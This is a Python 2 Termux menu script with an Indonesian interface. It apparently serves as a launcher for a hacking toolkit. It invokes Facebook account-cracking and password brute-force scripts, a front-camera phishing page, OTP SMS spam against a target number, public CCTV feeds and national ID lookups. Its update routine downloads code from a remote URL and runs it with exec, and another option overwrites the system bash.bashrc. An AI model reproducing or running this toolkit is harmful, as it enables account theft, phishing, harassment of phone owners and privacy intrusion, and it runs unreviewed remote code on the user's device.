# -*- coding: utf-8 -*-
import json, os, requests, shutil, sys, time
from warna import *
from requests.exceptions import ConnectionError
from time import sleep
reload (sys)
sys.setdefaultencoding ("utf8")


def jekitut():
	print u +"╔══╗"
	print u +"║"+ n +"No"+ u +"║"+ b +" Menu Yang Tersedia :"
	print u +"║  ║"
	print u +"║"+ n +"00"+ u +"║"+ n +" Pembaruan"
	print u +"║"+ c +"01"+ u +"║"+ c +" Bot"
	print u +"║"+ m +"02"+ u +"║"+ m +" Download Musik Di Spotify"
	print u +"║"+ h +"03"+ u +"║"+ h +" Facebook"
	print u +"║"+ k +"04"+ u +"║"+ k +" Hack Kamera Depan"
	print u +"║"+ p +"05"+ u +"║"+ p +" Live Streaming Cctv"
	print u +"║"+ b +"06"+ u +"║"+ b +" Nomor NIK Dan Nomor KK"
	print u +"║"+ n +"07"+ u +"║"+ n +" Sms Gratis"
	print u +"║"+ c +"08"+ u +"║"+ c +" Spam Kode OTP"
	print u +"║"+ m +"09"+ u +"║"+ m +" Streaming Musik Di Youtube"
	print u +"║"+ h +"99"+ u +"║"+ h +" Keluar"
	print u +"╚══╝\n"
	irul = raw_input (n +"›"+ h +"›"+ k +"›"+ m +"›"+ b +" Pilih Nomor : "+ n)
	if irul == "00" or irul == "0":
		pembaruan()
	elif irul == "01" or irul =="1":
		bot()
	elif irul == "02" or irul == "2":
		spotify()
	elif irul == "03" or irul == "3":
		facebook()
	elif irul == "04" or irul == "4":
		hack_kamera_depan()
	elif irul == "05" or irul == "5":
		os.system ("xdg-open http://www.insecam.org")
		menu()
	elif irul == "06" or irul == "6":
		os.system ("php n")
		enter()
		os.system ("xdg-open https://nabila-tools.000webhostapp.com/e-ktp.php")
		menu()
	elif irul == "07" or irul == "7":
		os.system ("python sg.py")
		enter()
		menu()
	elif irul == "08" or irul == "8":
		spam()
	elif irul == "09" or irul == "9":
		youtube()
	elif irul == "99" or irul == "99":
		os.system ("clear")
		os.system ("pwd")
		os.system ("exit")
	else:
		salah()
		menu()


def pembaruan():
	os.system ("sh 0")
	print u +"                    ╔═══════════╗"
	print u +"                    ║"+ k +" Pembaruan "+ u +"║"
	print u +"                    ╚═══════════╝\n"
	os.system ("php u")
	print u +"\n\n╔══╗"
	print u +"║"+ n +"No"+ u +"║"+ b +" Menu Yang Tersedia :"
	print u +"║  ║"
	print u +"║"+ h +"01"+ u +"║"+ h +" Memperbarui Data-Data Script"
	print u +"║"+ k +"02"+ u +"║"+ k +" Memperbarui Data-Data Termux"
	print u +"║"+ n +"09"+ u +"║"+ n +" Kembali"
	print u +"╚══╝\n"
	irul = raw_input (n +"›"+ h +"›"+ k +"›"+ m +"›"+ b +" Pilih Nomor : "+ n)
	if irul == "01" or irul == "1":
		os.system ("xdg-open https://api.whatsapp.com/send?phone=6285856232526&text=Ahmad%20Khoirul%20Marzuqin")
		os.system ("xdg-open https://www.facebook.com/ahmadkhoirulmarzuqin")
		os.system ("xdg-open https://m.me/ahmadkhoirulmarzuqin")
		os.system ("xdg-open https://www.instagram.com/ahmad_khoirul_marzuqin")
		os.system ("clear")
		os.chdir ("..")
		os.system ("rm -rf irul")
		os.system ("git clone https://github.com/jekitut/irul")
		os.chdir ("irul")
		os.system ("unzip irul.zip")
		os.system ("rm -f irul.zip")
		os.system ("rm -f update")
		os.chdir ("/data/data/com.termux/files/home/storage/shared")
		os.system ("rm -f Spotify.txt")
		os.chdir ("/data/data/com.termux/files/usr/etc")
		os.system ("rm -f bash.bashrc")
		os.chdir ("/data/data/com.termux/files/home/irul")
		shutil.move ("bash.bashrc", "/data/data/com.termux/files/usr/etc/bash.bashrc")
		os.chdir ("/data/data/com.termux/files/home/irul")
		shutil.move ("Spotify.txt", "/data/data/com.termux/files/home/storage/shared/Spotify.txt")
		os.chdir ("/data/data/com.termux/files/home/irul")
		os.system ("python2 irul.py")
	elif irul == "02" or irul == "2":
		os.system ("clear")
		os.system ("pkg update")
		os.system ("pkg upgrade")
		os.system ("pkg install bash")
		os.system ("pkg install curl")
		os.system ("pkg install figlet")
		os.system ("pkg install grep -y")
		os.system ("pkg install jq")
		os.system ("pkg install mc -y")
		os.system ("pkg install mpv -y")
		os.system ("pkg install nano")
		os.system ("pkg install openssh -y")
		os.system ("pkg install php -y")
		os.system ("pkg install python -y")
		os.system ("pkg install python2 -y")
		os.system ("pkg install python2-dev -y")
		os.system ("pkg install ruby -y")
		os.system ("pkg install termux-api")
		os.system ("pkg install unzip")
		os.system ("pkg install zip")
		os.system ("pkg install wget")
		os.system ("pip install --upgrade pip")
		os.system ("pip install bs4")
		os.system ("pip install mechanize")
		os.system ("pip install mps-youtube")
		os.system ("pip install mutagen")
		os.system ("pip install requests")
		os.system ("pip install spotdl")
		os.system ("pip install uncompyle6")
		os.system ("pip install youtube-dl")
		os.system ("pip2 install bs4")
		os.system ("pip2 install mechanize")
		os.system ("pip2 install mutagen")
		os.system ("pip2 install requests")
		os.system ("pip2 install uncompyle6")
		os.system ("gem install lolcat")
		os.system ("termux-setup-storage")
		menu()
	elif irul == "09" or irul == "9":
		menu()
	else:
		salah()
		pembaruan()


def bot():
	os.system ("clear")
	os.chdir ("bot")
	print u +"                       ╔═════╗"
	print u +"                       ║"+ k +" Bot "+ u +"║"
	print u +"                       ╚═════╝\n"
	print u +"╔══╗"
	print u +"║"+ n +"No"+ u +"║"+ b +" Menu Yang Tersedia :"
	print u +"║  ║"
	print u +"║"+ c +"00"+ u +"║"+ c +" Edit Data Aplikasi"
	print u +"║"+ h +"01"+ u +"║"+ h +" Baca Plus"
	print u +"║"+ h +"02"+ u +"║"+ h +" Caping"
	print u +"║"+ k +"03"+ u +"║"+ k +" Cashtree"
	print u +"║"+ k +"04"+ u +"║"+ k +" Flash Go"
	print u +"║"+ n +"09"+ u +"║"+ n +" Kembali"
	print u +"╚══╝\n"
	irul = raw_input (n +"›"+ h +"›"+ k +"›"+ m +"›"+ b +" Pilih Nomor : "+ n)
	if irul == "00" or irul == "0":
		def editdata():
			os.system ("clear")
			print u +"               ╔════════════════════╗"
			print u +"               ║"+ k +" Edit Data Aplikasi "+ u +"║"
			print u +"               ╚════════════════════╝\n"
			print u +"╔══╗"
			print u +"║"+ n +"No"+ u +"║"+ b +" Menu Yang Tersedia :"
			print u +"║  ║"
			print u +"║"+ h +"01"+ u +"║"+ h +" Cashtree"
			print u +"║"+ n +"09"+ u +"║"+ n +" Kembali"
			print u +"╚══╝"
			edit = raw_input (n +"›"+ h +"›"+ k +"›"+ m +"›"+ b +" Pilih Nomor : "+ n)
			if edit == "01" or edit == "1":
				os.system ("nano bct")
				os.chdir ("..")
				bot()
			elif edit == "09" or edit == "9":
				os.chdir ("..")
				bot()
			else:
				salah()
				editdata()
		editdata()
	elif irul == "01" or irul == "1":
		os.system ("php bb")
		enter()
		os.chdir ("..")
		bot()
	elif irul == "02" or irul == "2":
		os.chdir ("caping")
		os.system ("php bot_caping")
		enter()
		os.chdir ("../..")
		bot()
	elif irul == "03" or irul == "3":
		os.system ("php bct")
		enter()
		os.chdir ("..")
		bot()
	elif irul == "04" or irul == "4":
		os.system ("php bf")
		enter()
		os.chdir ("..")
		bot()
	elif irul == "09" or irul == "9":
		os.chdir ("..")
		menu()
	else:
		salah()
		os.chdir ("..")
		bot()


def spotify():
	def logo():
		os.system ("clear")
		print u +"            ╔═══════════════════════════╗"
		print u +"            ║"+ k +" Download Musik Di Spotify "+ u +"║"
		print u +"            ╚═══════════════════════════╝\n"
	logo()
	print n +"Pastikan Anda Sudah Mengisi Url Di"
	print n +"Memori Internal Dengan Nama "+ h + tebal +"Spotify.txt\n"+ n
	raw_input ( h +"Tekan Tombol Enter Untuk Melanjutkan ")
	logo()
	os.chdir ("/data/data/com.termux/files/home/storage/shared")
	os.system ("spotdl -l Spotify.txt -f Spotify")
	logo()
	os.chdir ("/data/data/com.termux/files/home/irul")
	print h +"✓"+ n +" Berhasil Mendownload Musik Ke"
	print n +"  Memori Internal Dengan Nama "+ h + tebal +"Spotify"+ n
	enter()
	menu()


def facebook():
	os.system ("clear")
	os.chdir ("facebook")
	print u +"                    ╔══════════╗"
	print u +"                    ║"+ k +" Facebook "+ u +"║"
	print u +"                    ╚══════════╝\n"
	print m +"                 !!! PERINGATAN !!!"
	print m +"            Saya Tidak Bertanggung Jawab"
	print m +"    Apabila Akun Facebook Anda Terkena Checkpoint\n"
	print u +"╔══╗"
	print u +"║"+ n +"No"+ u +"║"+ b +" Menu Yang Tersedia :"
	print u +"╚══╝"
	print u +"╔══╗"
	print u +"║  ║"+ k +" Hack Facebook"
	print u +"║"+ b +"01"+ u +"║"+ b +" Id Grub Target"
	print u +"║"+ b +"02"+ u +"║"+ b +" Id Target"+ n +" (1)"
	print u +"║"+ b +"03"+ u +"║"+ b +" Id Target"+ n +" (2)"
	print u +"║"+ b +"04"+ u +"║"+ b +" Password Target"+ n +" (1)"
	print u +"║"+ b +"05"+ u +"║"+ b +" Password Target"+ n +" (2)"
	print u +"╚══╝"
	print u +"╔══╗"
	print u +"║  ║"+ h +" Lain - Lain"
	print u +"║"+ b +"06"+ u +"║"+ b +" Dark Facebook v1.6"
	print u +"║"+ b +"07"+ u +"║"+ b +" Dark Facebook v1.7"
	print u +"║"+ b +"08"+ u +"║"+ b +" Osif"
	print u +"║"+ c +"09"+ u +"║"+ c +" Cadangkan Token Dari "+ h +"Script"+ n +" > "+ k +"Memori Internal"
	print u +"║"+ c +"10"+ u +"║"+ c +" Cadangkan Token Dari "+ k +"Memori Internal"+ n +" > "+ h +"Script"
	print u +"║"+ n +"99"+ u +"║"+ n +" Kembali"
	print u +"╚══╝\n"
	irul = raw_input (n +"›"+ h +"›"+ k +"›"+ m +"›"+ b +" Pilih Nomor : "+ n)
	
	
	def igt():
		os.system ("clear")
		print u +"         ╔════════════════════════════════╗"
		print u +"         ║"+ k +" Hack Facebook :"+ h +" Id Grub Target "+ u +"║"
		print u +"         ╚════════════════════════════════╝"
	
	
	def it():
		os.system ("clear")
		print u +"            ╔═══════════════════════════╗"
		print u +"            ║"+ k +" Hack Facebook :"+ h +" Id Target "+ u +"║"
		print u +"            ╚═══════════════════════════╝"
		
		
	def pt():
		os.system ("clear")
		print u +"         ╔═════════════════════════════════╗"
		print u +"         ║"+ k +" Hack Facebook :"+ h +" Password Target "+ u +"║"
		print u +"         ╚═════════════════════════════════╝"
		
		
	if irul == "01" or irul == "1":
		igt()
		os.system ("python2 igt_masuk")
		enter()
		os.chdir ("..")
		facebook()
	elif irul == "02" or irul == "2":
		it()
		os.system ("python2 it_masuk")
		enter()
		os.chdir ("..")
		facebook()
	elif irul == "03" or irul == "3":
		it()
		os.system ("python2 it_facebook_cracker_v2")
		enter()
		os.chdir ("..")
		facebook()
	elif irul == "04" or irul == "4":
		pt()
		os.system ("python2 pt_mbf_v1")
		enter()
		os.chdir ("..")
		facebook()
	elif irul == "05" or irul == "5":
		pt()
		os.system ("python2 pt_mbf_v2")
		enter()
		os.chdir ("..")
		facebook()
	elif irul == "06" or irul == "6":
		os.system ("python2 darkfb_v1.6")
		os.chdir ("..")
		facebook()
	elif irul == "07" or irul == "7":
		os.system ("python2 darkfb_v1.7")
		os.chdir ("..")
		facebook()
	elif irul == "08" or irul == "8":
		os.system ("python2 osif")
		enter()
		os.chdir ("..")
		facebook()
	elif irul == "09" or irul == "9":
		try:
			open ("login.txt", "r").read()
			os.chdir ("/data/data/com.termux/files/home/storage/shared")
			os.system ("rm -f login.txt")
			os.chdir ("/data/data/com.termux/files/home/irul/facebook")
			shutil.copy ("login.txt", "/data/data/com.termux/files/home/storage/shared")
			os.chdir ("/data/data/com.termux/files/home/irul")
			os.system ("clear")
			print h +"✓"+ n +" Berhasil Mencadangkan Token Ke"
			print n +"  Memori Internal Dengan Nama "+ h + tebal +"login.txt"+ n
			enter()
			facebook()
		except (KeyboardInterrupt, KeyError, IOError):
			os.system ("clear")
			os.chdir ("/data/data/com.termux/files/home/irul")
			print m +"!!! Token Tidak Ditemukan !!!"
			print n +"Buat Token Terlebih Dahulu Di"
			print k + tebal +"Dark Facebook"+ n +" Atau "+ k + tebal +"Osif"+ n
			enter()
			facebook()
	elif irul == "10":
		try:
			os.chdir ("/data/data/com.termux/files/home/storage/shared")
			open ("login.txt", "r").read()
			os.chdir ("/data/data/com.termux/files/home/irul/facebook")
			os.system ("rm -f login.txt")
			os.chdir ("/data/data/com.termux/files/home/storage/shared")
			shutil.copy ("login.txt", "/data/data/com.termux/files/home/irul/facebook")
			os.chdir ("/data/data/com.termux/files/home/irul")
			os.system ("clear")
			print h +"✓"+ n +" Berhasil Mencadangkan Token Ke"
			print n +"  Script Dengan Nama "+ h + tebal +"login.txt"+ n
			enter()
			facebook()
		except (KeyboardInterrupt, KeyError, IOError):
			os.system ("clear")
			os.chdir ("/data/data/com.termux/files/home/irul")
			print m +"!!! Token Tidak Ditemukan !!!"
			print n +"Pastikan File Ada Di Memori"
			print n +"Internal Dengan Nama "+ h + tebal +"login.txt"+ n
			enter()
			facebook()
	elif irul == "99":
		os.chdir ("..")
		menu()
	else:
		salah()
		os.chdir ("..")
		facebook()


def hack_kamera_depan():
	os.system ("clear")
	print u +"                ╔═══════════════════╗"
	print u +"                ║"+ k +" Hack Kamera Depan "+ u +"║"
	print u +"                ╚═══════════════════╝\n"
	print n +"Apakah Anda Ingin Mengganti Template Html"
	print h +"Tidak (Tekan Tombol Enter)"+ n +" Atau"
	data = raw_input (m +"Ya (Ketik Ya)"+ n +" : "+ b)
	if data == "Ya" or data == "ya" or data == "YA":
		try:
			os.chdir ("/data/data/com.termux/files/home/storage/shared")
			open ("irul.html", "r").read()
			os.chdir ("/data/data/com.termux/files/home/irul/hack_kamera_depan")
			os.system ("rm -f irul.html")
			os.chdir ("/data/data/com.termux/files/home/storage/shared")
			shutil.copy ("irul.html", "/data/data/com.termux/files/home/irul/hack_kamera_depan")
			os.chdir ("/data/data/com.termux/files/home/irul")
			os.system ("clear")
			print h +"✓"+ n +" Berhasil Mengganti Template Html"
			enter()
			hack_kamera_depan()
		except (KeyboardInterrupt, KeyError, IOError):
			os.system ("clear")
			os.chdir ("/data/data/com.termux/files/home/irul")
			print m +"!!! Template Html Tidak Ditemukan !!!"
			print n +"Pastikan File Ada Di Memori"
			print n +"Internal Dengan Nama "+ h + tebal +"irul.html"+ n
			enter()
			hack_kamera_depan()
	else:
		os.chdir ("hack_kamera_depan")
		os.system ("bash irul.sh")
		os.chdir ("..")
		menu()


def spam():
	os.system ("clear")
	print u +"                  ╔═══════════════╗"
	print u +"                  ║"+ k +" Spam Kode OTP "+ u +"║"
	print u +"                  ╚═══════════════╝\n"
	print u +"╔══╗"
	print u +"║"+ n +"No"+ u +"║"+ b +" Menu Yang Tersedia :"
	print u +"║  ║"
	print u +"║"+ h +"01"+ u +"║"+ h +" 23 Kode OTP"
	print u +"║"+ p +"02"+ u +"║"+ p +" King Tools"
	print u +"║"+ b +"03"+ u +"║"+ b +" REV-ZONE.NET"
	print u +"║"+ n +"09"+ u +"║"+ n +" Kembali"
	print u +"╚══╝\n"
	irul = raw_input (n +"›"+ h +"›"+ k +"›"+ m +"›"+ b +" Pilih Nomor : "+ n)
	if irul == "01" or irul == "1":
		os.chdir ("spam")
		def logo():
			os.system ("clear")
			print u +"              ╔══════════════════════╗"
			print u +"              ║"+ k +" Jumlah Kode OTP "+ n +":"+ h +" 23 "+ u +"║"
			print u +"              ╚══════════════════════╝\n"
		def bs():
			print n +"\nApakah Data-Data Di Atas Sudah"
			print h +"Benar (Tekan Tombol Enter)"+ n +" Atau"
			data = raw_input (m +"Salah (Ketik Salah)"+ n +" : "+ b)
			print ""
			if data == "Salah" or data == "salah" or data == "SALAH":
				os.system ("rm -f nomor.json")
				start()
			else:
				os.system ("python2 irul.py")
				enter()
				os.chdir ("..")
				spam()
		def start():
			try:
				open ("nomor.json", "r")
				logo()
				with open ("nomor.json") as baca:
					jl = json.load(baca)
					print k +"Nomor Tujuan"+ n +" : "+ h + jl["nomor"]
					print h +"Jumlah Pesan"+ n +" : "+ k + jl["jumlah"]
					print p +"Jeda Pesan"+ n +"   : "+ b + jl["jeda"]
				bs()
			except (KeyboardInterrupt, KeyError, IOError):
				logo()
				nomor = raw_input (k +"Nomor Tujuan"+ n +" : "+ h)
				jumlah = raw_input (h +"Jumlah Pesan"+ n +" : "+ k)
				jeda = raw_input (p +"Jeda Pesan  "+ n +" : "+ b)
				js = ({"nomor": nomor, "jumlah": jumlah, "jeda": jeda})
				with open ("nomor.json", "w") as tulis:
					json.dump(js, tulis)
				with open ("nomor.json") as baca:
					jl = json.load(baca)
					php = '[{"jeda": "'+ jl["jeda"] +'", "nomor": "'+ jl["nomor"]+ '", "jumlah": "'+ jl["jumlah"]+ '"}]'
					tulisphp = open ("nomor.php", "w")
					tulisphp.write(php)
					tulisphp.close()
				bs()
		start()
	elif irul == "02" or irul == "2":
		os.system ("xdg-open http://kingtools.id")
		spam()
	elif irul == "03" or irul == "3":
		os.system ("xdg-open https://www.rev-zone.net")
		spam()
	elif irul == "09" or irul == "9":
		menu()
	else:
		salah()
		spam()


def youtube():
	irul_youtube = raw_input (u +"\n›"+ k +" Judul Lagu : "+ h)
	os.system ("termux-tts-speak "+ irul_youtube)
	os.system ("mpsyt /"+ irul_youtube)
	menu()


def enter():
	raw_input (n + u +"\n               ╔════════════════════╗\n               ║"+ b +" Tekan Tombol Enter "+ u +"║\n               ╚════════════════════╝\n"+ n)


def salah():
	os.system ("clear")
	jalan (m +"!!! Nomor Yang Anda Masukkan Salah !!!")
	os.system ("termux-tts-speak Nomor Yang Anda Masukkan Salah")
	jalan (m +"!!! Silahkan Hubungi Pembuat Script Ini !!!")
	os.system ("termux-tts-speak Silahkan Hubungi Pembuat Script Ini")


def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		sleep (0.01)


def menu():
	os.system ("clear")
	hari = ("Senin", "Selasa", "Rabu", "Kamis", "Jum'at", "Sabtu", "Minggu")
	tanggal = ("01", "02", "03", "04", "05", "06", "07", "08", "09", "10", "11", "12", "13", "14", "15", "16", "17", "18", "19", "20", "21", "22", "23", "24", "25", "26", "27", "28", "29", "30", "31")
	bulan = ("Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "Nopember", "Desember")
	jam = ("00", "01", "02", "03", "04", "05", "06", "07", "08", "09", "10", "11", "12", "13", "14", "15", "16", "17", "18", "19", "20", "21", "22", "23")
	menit = ("00", "01", "02", "03", "04", "05", "06", "07", "08", "09", "10", "11", "12", "13", "14", "15", "16", "17", "18", "19", "20", "21", "22", "23", "24", "25", "26", "27", "28", "29", "30", "31", "32", "33", "34", "35", "36", "37", "38", "39", "40", "41", "42", "43", "44", "45", "46", "47", "48", "49", "50", "51", "52", "53", "54", "55", "56", "57", "58", "59")
	emit = time.localtime(time.time())
	print h +"Sekarang"+ n +"     : "+ str(hari[emit[6]]) +", "+ str(tanggal[emit[2]-1]) +" "+ str(bulan[emit[1]-1]) +" "+ str(emit[0]) + u +" ║ "+ n + str(jam[emit[3]]) +":"+ str(menit[emit[4]]) +":"+ str(menit[emit[5]])
	update()


def update():
	try:
		rg = requests.get ("https://raw.githubusercontent.com/jekitut/irul/master/update").text
		exec rg
		print u + 53 * "═"+ m +"\nNama Pembuat"+ n +" : "+ c + miring + tebal +"Ahmad Khoirul Marzuqin\n"+ n
		jekitut()
	except ConnectionError:
		titik = ["    ", "•   ", "••  ", "••• "]
		for t in titik:
			print m + tebal +"\r!!! Aktifkan Koneksi Internet "+ n + t,
			sys.stdout.flush()
			sleep (1)
		update()


menu()